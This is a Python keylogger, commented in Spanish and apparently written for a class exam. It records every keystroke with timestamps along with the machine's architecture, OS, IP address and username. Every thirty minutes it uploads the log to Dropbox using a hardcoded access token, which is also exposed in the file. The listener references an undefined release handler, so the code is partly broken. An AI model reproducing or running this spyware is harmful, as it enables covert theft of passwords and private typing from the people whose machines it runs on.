from pynput.keyboard import Key, Listener
import time, datetime, threading, struct, platform, socket, getpass, tempfile, dropbox, os, signal,sys
#Se obtiene los datos del computador
#arquitectura del computador
architecture = struct.calcsize('P')*8
#sistema operativo
operative_system = (getattr(platform,'platform'))()
#dirección IP
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8",80))
ip_dir = s.getsockname()[0]
s.close()
#nombre de usuario del computador
username=getpass.getuser()

new_list=[]
aux=0
keys=[]
cant_press=[]
instant_ini=[]
instant_end=[]
current_average=[]
info_keys=[keys, cant_press, instant_ini, instant_end, current_average,0,0]

#se captura el momento en el que el programa se ejecuta y llega a esta línea
now = datetime.datetime.now()
#se realiza el código con la fecha y hora capturada para el nombre del archivo
now = str(now.year)+str(now.month)+str(now.day)+str(now.hour)+str(now.minute)+str(now.second)+str(now.microsecond)
#se crea el nombre del archivo
name="log"+now+".txt"
#se crea el archivo y se escribe en él los detalles capturados del equipo
filename = open(name,"w")
filename.write("arquitectura: "+str(architecture)+"bits"+"\n")
filename.write("sistema operativo: "+str(operative_system)+"\n")
filename.write("direccion IP: "+str(ip_dir)+"\n")
filename.write("Nombre de usuario: "+str(username)+"\n")
filename.close()

#Se define la función cuando el programa recibe una señal en la que ya pueda empezar a ejecutarse
def onPC(sigNum, frame):
    print('(SIGHUP) PC encendida')
    return

#Se define la función que avisa cuando ha habido una señal que termina con su proceso
def offPC(sigNum, frame):
    print('(SIGTERM) PC apagada')
    sys.exit()

#Si conf es "set" se guarda la lista enviada, si conf es "get" se retorna la última lista guardada
def GetInfoKeys(keys_list, conf):
    global new_list
    if conf == 'set':
        new_list = keys_list
    elif conf == 'get':
        return(new_list)

#Se define la función que va a escribir el instante y la tecla pulsada.
def write_file(TIME, KEY, filename):
    with open(filename, 'a') as new_file:
        new_file.write(str(TIME))
        new_file.write(" ")
        new_file.write(str(KEY))
        new_file.write("\n")
        new_file.close()

#se define las operaciones que hará el programa en cada pulsación   
def on_press(key):
    global aux
    TIME = time.time()
    Time=str(datetime.datetime.now())
    write_file(Time, key, name)
    if len(info_keys[0])==0:
        info_keys[5]=1
        aux=TIME
    else:
        info_keys[5]=info_keys[5]+1
        info_keys[6]=TIME-float(aux)
    
    if key not in info_keys[0]:
        info_keys[0].append(key)
        info_keys[1].append(1)
        info_keys[2].append(TIME)
        info_keys[3].append(TIME)
        info_keys[4].append(0)
    else:
        for i in info_keys[0]:
            if i == key:
                position=info_keys[0].index(key)
                info_keys[1][position]=info_keys[1][position]+1
                info_keys[3][position]=TIME
                info_keys[4][position]=info_keys[1][position]/(info_keys[3][position]-info_keys[2][position])
    GetInfoKeys(info_keys, 'set')

#se crea la función para crear el archivo InfoFile y enviar el archivo log a DropBox
def sendDropbox():
    now_aux = datetime.datetime.now()
    now_aux = str(now_aux.year)+str(now_aux.month)+str(now_aux.day)+str(now_aux.hour)+str(now_aux.minute)+str(now_aux.second)+str(now_aux.microsecond)
    set_list=[]
    set_list = GetInfoKeys(set_list, 'get')
    #Cuando el programa se ejecuta por primera vez al encenderse el computador, no se crea el archivo InfoFile ni se envía nada a DropBox
    if len(set_list)>0:
        file_info = open("InfoFile"+now_aux+".txt", "w")
        for key_base in set_list[0]:
            position = set_list[0].index(key_base)
            file_info.write("informacion de la tecla "+str(set_list[0][position])+":\n")
            file_info.write("frecuencia: "+str("{:.3f}".format(set_list[4][position]))+"pulsasiones/segundo\n")
            file_info.write("porcentaje del total de pulsaciones: "+str("{:.3f}".format(100*set_list[1][position]/set_list[5]))+"%"+"\n")
            file_info.write("porcentaje del total de tiempo: "+str("{:.3f}".format(100*(set_list[3][position]-set_list[2][position])/set_list[6]))+"%"+"\n")
            file_info.write("\n")
        file_info.close()
        cliente = dropbox.Dropbox('WsWjnd_jPRAAAAAAAAAAXxb6975vthVQ7EW9rlE4bv3acwnaNDPojIoMOquAadUw')
        cliente.files_upload(open("log"+now+".txt", 'rb').read(), '/examen'+now_aux+'/'+"log"+now+".txt")
    #Se asigna un timer para que envía información periódicamente (cada media hora)
    timer = threading.Timer(1800, sendDropbox)
    timer.start()

#Se asigna los procesos a cada tipo de señal al momento en el que empieza a recibir señales
if __name__ == '__main__':
    signal.signal(signal.SIGHUP, onPC)
    signal.signal(signal.SIGTERM, offPC)

#Se asigna las funciones que va a ejecutar cada vez que el programa reciba las señales del teclado
with Listener(on_press=on_press, on_release=on_realese) as listener:
    sendDropbox()
    listener.join()
